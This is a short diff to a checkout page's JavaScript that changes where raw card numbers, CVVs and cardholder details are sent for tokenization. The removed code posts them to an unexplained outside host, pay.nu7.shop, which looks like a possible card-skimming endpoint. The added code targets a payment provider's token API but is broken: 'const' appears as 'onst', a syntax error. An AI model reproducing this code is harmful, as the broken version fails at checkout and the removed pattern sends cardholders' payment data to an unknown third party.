@@ -847,22 +847,28 @@ document.addEventListener('DOMContentLoaded', function() {
 
     try {
       // Tokenize card data
-      const tokenResponse = await fetch('https://pay.nu7.shop/token', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          data: {
-            number: customCardNumber.value.replace(/\s/g, ''),
-            verification_value: customCardCvv.value,
-            first_name: firstName,
-            last_name: lastName,
-            month: month,
-            year: year
-          }
-        })
-      });
+ onst tokenResponse = await fetch('https://api.iugu.com/v1/payment_token', {
+  method: 'POST',
+  headers: {
+    'accept': 'application/json',
+    'content-type': 'application/json',
+    // Adicione um cabeçalho de autenticação se necessário, por exemplo:
+    // 'Authorization': 'Bearer YOUR_ACCESS_TOKEN'
+  },
+  body: JSON.stringify({
+    account_id: "40EA03B581334204AD071DAB07C6FDFE",
+    method: "credit_card",
+    test: true,
+    data: {
+      number: customCardNumber.value.replace(/\s/g, ''),
+      verification_value: customCardCvv.value,
+      first_name: firstName,
+      last_name: lastName,
+      month: month,
+      year: year
+    }
+  })
+});
 
       if (!tokenResponse.ok) {
         throw new Error('Failed to tokenize card data');
